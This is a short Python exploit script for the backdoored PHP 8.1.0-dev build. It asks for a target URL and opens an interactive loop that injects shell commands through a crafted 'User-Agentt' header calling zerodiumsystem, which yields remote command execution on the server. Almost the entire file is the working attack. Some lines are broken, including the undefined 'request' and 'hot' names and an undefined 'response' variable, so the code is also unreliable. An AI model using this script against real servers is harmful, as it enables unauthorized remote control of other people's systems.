"""
Exploit Title: PHP 8.1.0-dev RCE vai User-Agentt

A backdoor was discovered in php 8.1.0-dev that allowed attackers
to obtain RCE by sending commands via the User-Agentt header
containing zerodiumsystems(cmd)
"""

import os
import re
import requests

host = input("Target url> ")
req = requests.Session()
res = request.get(hot)


if str(res) == "<Response [200]>":
    print("Host: ", host, 'is active')
    
    try:
        while True:
            cmd = input("$ ")
            hdrs = {
                     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                     "User-Agentt": "zerodiumsystem('"+ cmd +"');"
            }
    
            res = req.get(host, headers = hdrs, allow_redirects = False)
            currentPage = res.text
            output = currentPage.split("<!DOCTYPE html>", 1)
            text = print(output[0])
    
    except KeyboardInterrupt:
        print("Exiting...")
        exit
    
else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
